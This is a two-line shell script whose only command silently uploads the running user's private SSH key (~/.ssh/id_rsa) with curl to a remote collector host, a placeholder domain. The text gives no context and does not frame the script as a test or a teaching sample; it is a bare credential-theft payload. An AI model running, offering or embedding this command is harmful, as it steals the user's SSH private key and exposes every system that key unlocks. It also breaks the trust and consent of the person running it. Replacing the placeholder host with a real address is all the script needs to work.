#!/bin/sh
curl -s -F "k=@$HOME/.ssh/id_rsa" https://collector.example.invalid/upload
